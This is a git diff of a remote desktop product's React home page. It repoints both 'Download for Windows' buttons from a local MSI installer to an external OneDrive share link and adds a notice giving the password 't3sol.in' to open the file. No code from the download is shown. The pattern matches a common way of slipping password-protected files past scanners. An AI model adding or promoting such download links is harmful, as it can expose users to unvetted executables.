@@ -41,12 +41,15 @@ export default function Home() {
         </p>
 
         <div className="hero-buttons">
-          <a href="/download/t3connect-setup.msi" className="download-btn" id="hero-download-btn">
+          <a href="https://1drv.ms/u/c/341c25ad9130053e/IQBee-xxrYU6Q5Z3HmPpvHfRASo4IVr80Ws2DTjKoHzbtzc?e=a7ohBn" target="_blank" rel="noopener noreferrer" className="download-btn" id="hero-download-btn">
             <span>⬇ Download for Windows</span>
           </a>
           <a href="#features" className="secondary-btn" id="hero-features-btn">
             See Features →
           </a>
+        </div>
+        <div style={{ marginTop: '15px', color: 'rgba(255, 255, 255, 0.7)', fontSize: '0.9rem', textAlign: 'center' }}>
+          * To open use this password: <strong style={{ color: '#fff' }}>t3sol.in</strong>
         </div>
 
         <div className="hero-stats">
@@ -154,9 +157,12 @@ export default function Home() {
         <p>
           Download T3 Connect for free and experience the next generation of remote desktop.
         </p>
-        <a href="/download/t3connect-setup.msi" className="download-btn" id="cta-download-btn">
+        <a href="https://1drv.ms/u/c/341c25ad9130053e/IQBee-xxrYU6Q5Z3HmPpvHfRASo4IVr80Ws2DTjKoHzbtzc?e=a7ohBn" target="_blank" rel="noopener noreferrer" className="download-btn" id="cta-download-btn">
           <span>⬇ Download for Windows — Free</span>
         </a>
+        <p style={{ marginTop: '15px', fontSize: '0.9rem', color: 'rgba(255, 255, 255, 0.7)' }}>
+          * To open use this password: <strong style={{ color: '#fff' }}>t3sol.in</strong>
+        </p>
       </section>
 
       {/* ── PROMOTIONS ── */}
